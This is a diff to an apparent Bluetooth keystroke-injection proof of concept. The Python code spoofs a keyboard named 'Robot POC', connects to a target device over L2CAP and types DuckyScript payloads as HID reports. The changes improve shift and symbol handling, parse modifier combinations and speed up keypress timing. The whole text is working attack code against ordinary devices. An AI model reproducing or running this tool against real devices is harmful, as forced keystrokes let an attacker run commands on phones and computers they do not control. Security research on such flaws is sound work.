@@ -96,26 +96,33 @@ class PairingAgent:
             log.error(f"Error terminating agent process: {e}")
             raise
 
+class L2CAPConnectionManager:
+    def __init__(self, target_address):
+        self.target_address = target_address
+        self.clients = {}
+
+    def create_connection(self, port):
+        client = L2CAPClient(self.target_address, port)
+        self.clients[port] = client
+        return client
+
+    def connect_all(self):
+        try:
+            return sum(client.connect() for client in self.clients.values())
+        except ConnectionFailureException as e:
+            log.error(f"Connection failure: {e}")
+            raise
+
+    def close_all(self):
+        for client in self.clients.values():
+            client.close()
+
 class L2CAPClient:
     def __init__(self, addr, port):
         self.addr = addr
         self.port = port
         self.connected = False
         self.sock = None
-
-    def encode_combo_input(*args):
-        if not args:
-            return bytes([0xA1, 0x01] + [0] * 8)  # Empty report for key release
-
-        # Filter out non-Key_Codes arguments and process
-        valid_args = [a for a in args if isinstance(a, Key_Codes)]
-
-        # Properly sum the values of modifiers
-        modifiers = sum(a.value for a in valid_args if a in Key_Codes.MODIFIERS)
-
-        keycodes = [a.value for a in valid_args if a not in Key_Codes.MODIFIERS]
-        keycodes += [0] * (6 - len(keycodes))
-        return bytes([0xA1, 0x01, modifiers, 0x00] + keycodes)
 
     def encode_keyboard_input(*args):
       keycodes = []
@@ -142,7 +149,7 @@ class L2CAPClient:
             return
 
         log.debug(f"[TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
-        if self.attempt_send(data, 0.1):
+        if self.attempt_send(data, 0.001):
             log.debug(f"[TX-{self.port}] Data sent successfully")
         else:
             log.error(f"[TX-{self.port}] ERROR! Timed out sending data")
@@ -205,7 +212,7 @@ class L2CAPClient:
     def send_keyboard_report(self, *args):
         self.send(self.encode_keyboard_input(*args))
 
-    def send_keypress(self, *args, delay=0.05):
+    def send_keypress(self, *args, delay=0.01):
         if args:
             log.debug(f"Attempting to send... {args}")
             self.send(self.encode_keyboard_input(*args))
@@ -214,117 +221,194 @@ class L2CAPClient:
             self.send(self.encode_keyboard_input())
         time.sleep(delay)
 
-    def send_combination(self, *keys, delay=0.05):
-        """
-        Send a combination of keys, which can include modifiers and regular keys.
-        """
-        modifiers = 0
-        regular_keys = []
-
-        for key in keys:
-            if key in Key_Codes.MODIFIERS:
-                modifiers |= key.value
-            else:
-                regular_keys.append(key.value)
-
-        # Ensure that no more than 6 regular keys are sent
-        regular_keys = regular_keys[:6] + [0] * (6 - len(regular_keys))
-
-        # Create the HID report and send it
-        report = bytes([0xa1, 0x01, modifiers, 0x00] + regular_keys)
-        self.send(report)
+    def send_keyboard_combination(self, modifier, key, delay=0.01):
+        # Press the combination
+        press_report = self.encode_keyboard_input(modifier, key)
+        self.send(press_report)
+        time.sleep(delay)  # Delay to simulate key press
+    
+        # Release the combination
+        release_report = self.encode_keyboard_input()
+        self.send(release_report)
         time.sleep(delay)
 
-        # Send an empty report to release the keys
-        self.send(self.encode_combo_input())
+def process_duckyscript(client, duckyscript):
+    client.send_keypress('')  # Send empty report
+    time.sleep(0.5)
 
-class L2CAPConnectionManager:
-    def __init__(self, target_address):
-        self.target_address = target_address
-        self.clients = {}
+    shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
-    def create_connection(self, port):
-        client = L2CAPClient(self.target_address, port)
-        self.clients[port] = client
-        return client
+    for line in duckyscript:
+        line = line.strip()
+        if not line or line.startswith("REM"):
+            continue
 
-    def connect_all(self):
-        try:
-            return sum(client.connect() for client in self.clients.values())
-        except ConnectionFailureException as e:
-            log.error(f"Connection failure: {e}")
-            raise
+        if line.startswith("STRING"):
+            text = line[7:]
+            for char in text:
+                try:
+                    if char.isdigit():
+                        key_code = getattr(Key_Codes, f"_{char}")
+                        client.send_keypress(key_code)
+                    elif char == " ":
+                        client.send_keypress(Key_Codes.SPACE)
+                    elif char == "[":
+                        client.send_keypress(Key_Codes.LEFTBRACE)
+                    elif char == "]":
+                        client.send_keypress(Key_Codes.RIGHTBRACE)
+                    elif char == ";":
+                        client.send_keypress(Key_Codes.SEMICOLON)
+                    elif char == "'":
+                        client.send_keypress(Key_Codes.QUOTE)
+                    elif char == "/":
+                        client.send_keypress(Key_Codes.SLASH)
+                    elif char == ".":
+                        client.send_keypress(Key_Codes.DOT)
+                    elif char == ",":
+                        client.send_keypress(Key_Codes.COMMA)
+                    elif char == "|":
+                        client.send_keypress(Key_Codes.PIPE)
+                    elif char == "-":
+                        client.send_keypress(Key_Codes.MINUS)
+                    elif char == "=":
+                        client.send_keypress(Key_Codes.EQUAL)
+                    elif char in shift_required_characters:
+                        key_code_str = char_to_key_code(char)
+                        if key_code_str:
+                            key_code = getattr(Key_Codes, key_code_str)
+                            client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
+                        else:
+                            log.warning(f"Unsupported character '{char}' in Duckyscript")
+                    elif char.isalpha():
+                        key_code = getattr(Key_Codes, char.lower())
+                        if char.isupper():
+                            client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
+                        else:
+                            client.send_keypress(key_code)
+                    else:
+                        key_code = char_to_key_code(char)
+                        if key_code:
+                            client.send_keypress(key_code)
+                        else:
+                            log.warning(f"Unsupported character '{char}' in Duckyscript")
 
-    def close_all(self):
-        for client in self.clients.values():
-            client.close()
+                    client.send_keypress()  # Release after each key press
+                except AttributeError as e:
+                    log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")
 
-def terminate_child_processes():
-    for proc in child_processes:
-        if proc.is_alive():
-            proc.terminate()
-            proc.join()
+        elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
+            # Process modifier key combinations
+            components = line.split()
+            if len(components) == 2:
+                modifier, key = components
+                try:
+                    # Convert to appropriate enums
+                    modifier_enum = getattr(Modifier_Codes, modifier.upper())
+                    key_enum = getattr(Key_Codes, key.lower())
+                    client.send_keyboard_combination(modifier_enum, key_enum)
+                    log.debug(f"Sent combination: {line}")
+                except AttributeError:
+                    log.warning(f"Unsupported combination: {line}")
+            else:
+                log.warning(f"Invalid combination format: {line}")
 
-def setup_bluetooth(target_address):
-    restart_bluetooth_daemon()
-    profile_proc = Process(target=register_hid_profile, args=('hci0', target_address))
-    profile_proc.start()
-    child_processes.append(profile_proc)
-    adapter = Adapter('hci0')
-    adapter.set_property("name", "Robot POC")
-    adapter.set_property("class", 0x002540)
-    adapter.power(True)
-    return adapter
+def char_to_key_code(char):
+    # Mapping for special characters that always require SHIFT
+    shift_char_map = {
+        '!': 'EXCLAMATION_MARK',
+        '@': 'AT_SYMBOL',
+        '#': 'HASHTAG',
+        '$': 'DOLLAR',
+        '%': 'PERCENT_SYMBOL',
+        '^': 'CARET_SYMBOL',
+        '&': 'AMPERSAND_SYMBOL',
+        '*': 'ASTERISK_SYMBOL',
+        '(': 'OPEN_PARENTHESIS',
+        ')': 'CLOSE_PARENTHESIS',
+        '_': 'UNDERSCORE_SYMBOL',
+        '+': 'KEYPADPLUS',
+	    '{': 'LEFTBRACE',
+	    '}': 'RIGHTBRACE',
+	    ':': 'SEMICOLON',
+	    '\\': 'BACKSLASH',
+	    '"': 'QUOTE',
+        '<': 'COMMA',
+        '>': 'DOT',
+	    '?': 'QUESTIONMARK',
+	    'A': 'a',
+	    'B': 'b',
+	    'C': 'c',
+	    'D': 'd',
+	    'E': 'e',
+	    'F': 'f',
+	    'G': 'g',
+	    'H': 'h',
+	    'I': 'i',
+	    'J': 'j',
+	    'K': 'k',
+	    'L': 'l',
+	    'M': 'm',
+	    'N': 'n',
+	    'O': 'o',
+	    'P': 'p',
+	    'Q': 'q',
+	    'R': 'r',
+	    'S': 's',
+	    'T': 't',
+	    'U': 'u',
+	    'V': 'v',
+	    'W': 'w',
+	    'X': 'x',
+	    'Y': 'y',
+	    'Z': 'z',
+	
+    }
+    return shift_char_map.get(char)
 
 # Key codes for modifier keys
 class Modifier_Codes(Enum):
-    LEFTCONTROL = 0xe0
-    LEFTSHIFT = 0xe1
-    LEFTALT = 0xe2
-    LEFTGUI = 0xe3
-    RIGHTCONTROL = 0xe4
-    RIGHTSHIFT = 0xe5
-    RIGHTALT = 0xe6
-    RIGHTGUI = 0xe7
+    CTRL = 0x01
+    RIGHTCTRL = 0x10
 
-    # Convenience mappings for common names
-    CTRL = LEFTCONTROL
-    ALT = LEFTALT
-    SHIFT = LEFTSHIFT
-    GUI = LEFTGUI
+    SHIFT = 0x02
+    RIGHTSHIFT = 0x20
 
-# Modifier Key Set for easy checking
-MODIFIER_KEYS_SET = {Modifier_Codes.LEFTCONTROL, Modifier_Codes.LEFTSHIFT, Modifier_Codes.LEFTALT, Modifier_Codes.LEFTGUI,
-                     Modifier_Codes.RIGHTCONTROL, Modifier_Codes.RIGHTSHIFT, Modifier_Codes.RIGHTALT, Modifier_Codes.RIGHTGUI}
+    ALT = 0x04
+    RIGHTALT = 0x40
+
+    GUI = 0x08
+    WINDOWS = 0x08
+    COMMAND = 0x08
+    RIGHTGUI = 0x80
 
 class Key_Codes(Enum):
     NONE = 0x00
-    A = 0x04
-    B = 0x05
-    C = 0x06
-    D = 0x07
-    E = 0x08
-    F = 0x09
-    G = 0x0a
-    H = 0x0b
-    I = 0x0c
-    J = 0x0d
-    K = 0x0e
-    L = 0x0f
-    M = 0x10
-    N = 0x11
-    O = 0x12
-    P = 0x13
-    Q = 0x14
-    R = 0x15
-    S = 0x16
-    T = 0x17
-    U = 0x18
-    V = 0x19
-    W = 0x1a
-    X = 0x1b
-    Y = 0x1c
-    Z = 0x1d
+    a = 0x04
+    b = 0x05
+    c = 0x06
+    d = 0x07
+    e = 0x08
+    f = 0x09
+    g = 0x0a
+    h = 0x0b
+    i = 0x0c
+    j = 0x0d
+    k = 0x0e
+    l = 0x0f
+    m = 0x10
+    n = 0x11
+    o = 0x12
+    p = 0x13
+    q = 0x14
+    r = 0x15
+    s = 0x16
+    t = 0x17
+    u = 0x18
+    v = 0x19
+    w = 0x1a
+    x = 0x1b
+    y = 0x1c
+    z = 0x1d
     _1 = 0x1e
     _2 = 0x1f
     _3 = 0x20
@@ -344,50 +428,53 @@ class Key_Codes(Enum):
     EQUAL = 0x2e
     LEFTBRACE = 0x2f
     RIGHTBRACE = 0x30
-    BACKSLASH = 0x31
-    SEMICOLON = 0x33
-    QUOTE = 0x34
-    BACKTICK = 0x35
-    COMMA = 0x36
-    DOT = 0x37
-    SLASH = 0x38
     CAPSLOCK = 0x39
+    VOLUME_UP = 0xed
+    VOLUME_DOWN = 0xee
+    SEMICOLON = 0x33
+    COMMA = 0x36
+    PERIOD = 0x37
+    SLASH = 0x38
+    PIPE = 0x31
+    BACKSLASH = 0x31
+    GRAVE = 0x35
+    APOSTROPHE = 0x34
+    LEFT_BRACKET = 0x2f
+    RIGHT_BRACKET = 0x30
+    DOT = 0x37
 
-def process_duckyscript(client, duckyscript):
-    client.send_keypress('')  # Send empty report
-    time.sleep(0.5)
+    # SHIFT KEY MAPPING
+    EXCLAMATION_MARK = 0x1e
+    AT_SYMBOL = 0x1f
+    HASHTAG = 0x20
+    DOLLAR = 0x21
+    PERCENT_SYMBOL = 0x22
+    CARET_SYMBOL = 0x23
+    AMPERSAND_SYMBOL = 0x24
+    ASTERISK_SYMBOL = 0x25
+    OPEN_PARENTHESIS = 0x26
+    CLOSE_PARENTHESIS = 0x27
+    UNDERSCORE_SYMBOL = 0x2d
+    QUOTE = 0x34
+    QUESTIONMARK = 0x38
+    KEYPADPLUS = 0x57
 
-    for line in duckyscript:
-        line = line.strip()
-        if not line or line.startswith("REM"):
-            continue  # Skip empty lines and comments
+def terminate_child_processes():
+    for proc in child_processes:
+        if proc.is_alive():
+            proc.terminate()
+            proc.join()
 
-        if line.startswith("STRING"):
-            text = line[7:]
-            for letter in text:
-                try:
-                    # Use upper() to match the uppercase keys defined in Key_Codes
-                    key_code = getattr(Key_Codes, letter.upper()) if letter != " " else Key_Codes.SPACE
-                    client.send_keypress(key_code)
-                    client.send_keypress()
-                    time.sleep(0.05)  # Add a small delay between keypresses
-                except AttributeError:
-                    log.warning(f"Unsupported character '{letter}' in Duckyscript")
-
-        elif line.startswith("GUI"):
-            # Handle combination keys
-            components = line.split()
-            try:
-                # Use Modifier_Codes for modifier keys
-                modifier = getattr(Modifier_Codes, components[0].upper())
-                for key in components[1:]:
-                    # Use Key_Codes for regular keys
-                    key_code = getattr(Key_Codes, key.upper(), None)
-                    if key_code:
-                        client.send_combination(modifier, key_code)
-                        client.send_combination()  # Release keys
-            except AttributeError:
-                log.warning(f"Unsupported key or modifier in line: {line}")
+def setup_bluetooth(target_address):
+    restart_bluetooth_daemon()
+    profile_proc = Process(target=register_hid_profile, args=('hci0', target_address))
+    profile_proc.start()
+    child_processes.append(profile_proc)
+    adapter = Adapter('hci0')
+    adapter.set_property("name", "Robot POC")
+    adapter.set_property("class", 0x002540)
+    adapter.power(True)
+    return adapter
 
 def initialize_pairing(agent_iface, target_address):
     try:
